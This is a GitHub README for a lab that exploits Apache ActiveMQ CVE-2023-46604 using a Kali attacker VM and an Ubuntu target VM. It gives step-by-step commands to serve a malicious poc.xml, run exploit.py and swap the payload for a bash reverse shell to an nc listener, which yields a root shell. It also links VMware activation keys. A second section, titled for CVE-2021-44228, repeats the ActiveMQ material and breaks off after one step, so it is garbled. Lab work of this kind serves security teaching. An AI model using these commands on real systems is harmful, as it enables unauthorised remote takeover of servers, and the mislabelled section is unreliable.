
# CVE-2023-46604 Lab
This lab guides on exploiting vulnerabilities of CVE-2023-46604
## Acknowledgements
 - [Apache ActiveMQ](https://activemq.apache.org/code-overview)
 - [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
## Environment
This lab requires the installation of 2 virtual machines. One Kali Linux machine version 2023.4 and one Ubuntu machine version 22.04.3 LTS. You can download them here:
- [Kali Linux 2023.4](https://kali.download/base-images/kali-2023.4/kali-linux-2023.4-vmware-amd64.7z)
- [Ubuntu 22.04.3 LTS](https://releases.ubuntu.com/22.04.3/ubuntu-22.04.3-desktop-amd64.iso)
- [VMware-workstation-17.5.0 for windows](https://download3.vmware.com/software/WKST-1750-WIN/VMware-workstation-full-17.5.0-22583795.exe)
- [VMware-workstation-17.5.0 for linux](https://download3.vmware.com/software/WKST-1750-LX/VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle)
- [Key active VMWare 17 pro](https://gist.github.com/PurpleVibe32/30a802c3c8ec902e1487024cdea26251)
## Documentation
[Documentation](https://linktodocumentation)
## Model and system requirements
![](https://github.com/dcm2406/CVELab/blob/master/Model%20CVE-2023-46604.png)
**On Kali Linux machine:**
- Install git
```command
$sudo apt install git
```
- Install gedit
```command
$sudo apt install gedit
```
- Install python (already available on kali linux)
- Install Netcat (already available on kali linux)

**On Ubuntu machine:**
- Install git
```command
$sudo apt install git
```
- Install openjdk 18
```command
$sudo apt install openjdk-18-jdk
```
- Install ActiveMQ 5.18.2 package
```command
$sudo su
$git clone https://github.com/dcm2406/ApacheActiveMQ
$cd ApacheActiveMQ/
$tar -xf apache-activemq-5.18.2-bin.tar.gz
```

## Exploiting
**Step 1: Launch the activemq service on the Ubuntu machine**

Open a terminal window and run the command as below:
```command
$sudo su
$cd ApacheActiveMQ/apache-activemq-5.18.2/bin/linux-x86-64
$./activemq start
```
Check the status of the service:
```command
$./activemq status
```
If the service starts successfully, it will display on the terminal screen as "ActiveMQ Brocker is running".

You can also visit http://127.0.0.1:8161 to open ActiveMQ broker manager.It includes the hostname, version, ID, up time and some other information.

**Step 2: Set up on Kali Linux machine to attack**

Download resources for the exploiting process:
```command
$sudo su
$git clone https://github.com/dcm2406/CVE-2023-46604
$cd CVE-2023-46604
$ls
```
As you can see, we have 2 files exploit.py and poc.xml:
- The poc.xml file contains a piece of malicious code that takes advantage of a vulnerability in the OpenWire protocol.
- The exploit.py file is responsible for HTTP encrypting and sending the poc.xml file to Brocker on the target machine.
Open a web server at the resource path:
```command
$cd CVE-2023-46604
$python3 -m http.server
```
Open a new terminal window to send the poc.xml file to the target's server via the exploit.py file:
```command
$sudo su
$cd CVE-2023-46604
$python3 exploit.py -i 192.168.132.135 -p 61616 --xml http://192.168.132.130:8000/poc.xml
```
After the command is executed, the Calculator application is launched on the target machine. This proves that the vulnerability has been successfully exploited. We continue to create a reverse shell to control the target machine.

Open a new terminal window to listen for reverse shell connections:
```command
$sudo su
$nc -nlvp 4444
```
Return to the previous terminal and edit the poc.xml file:
```command
$gedit poc.xml
```
Replace the value **gnome-calculator** with **bash -i &gt;&amp; /dev/tcp/192.168.132.130/4444 0&gt;&amp;1** and save the file.

Sending malicious code again:
```command
$python3 exploit.py -i 192.168.132.135 -p 61616 --xml http://192.168.132.130:8000/poc.xml
```

The result of this command is that we have obtained the root shell on the target machine.
# CVE-2021-44228 Lab

## Acknowledgements
 - [Apache ActiveMQ](https://activemq.apache.org/code-overview)
 - [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
## Environment
This lab requires the installation of 2 virtual machines. One Kali Linux machine version 2023.4 and one Ubuntu machine version 22.04.3 LTS. You can download them here:
- [Kali Linux 2023.4](https://kali.download/base-images/kali-2023.4/kali-linux-2023.4-vmware-amd64.7z)
- [Ubuntu 22.04.3 LTS](https://releases.ubuntu.com/22.04.3/ubuntu-22.04.3-desktop-amd64.iso)
- [VMware-workstation-17.5.0 for windows](https://download3.vmware.com/software/WKST-1750-WIN/VMware-workstation-full-17.5.0-22583795.exe)
- [VMware-workstation-17.5.0 for linux](https://download3.vmware.com/software/WKST-1750-LX/VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle)
- [Key active VMWare 17 pro](https://gist.github.com/PurpleVibe32/30a802c3c8ec902e1487024cdea26251)

## Documentation

[Documentation](https://linktodocumentation)


## Model and system requirements

![a](https://github.com/dcm2406/CVELab/blob/master/Model%20CVE-2023-46604.png)

**On Kali Linux machine:**
- Installed git
```command
sudo apt install git
```
- Installed gedit
- Installed python
- Installed Netcat

**On Ubuntu machine:**
- Installed git
- Installed openjdk 18
- Installed ActiveMQ 5.18.2 package

## Exploiting
Step 1: On the Ubuntu machine, launch the activemq service

## Support

For support, email dcm240602@gmail.com or txc3000@gmail.com


## Authors

- [@dcm2406](https://github.com/dcm2406)
- [@txc3000](https://github.com/txc3000)

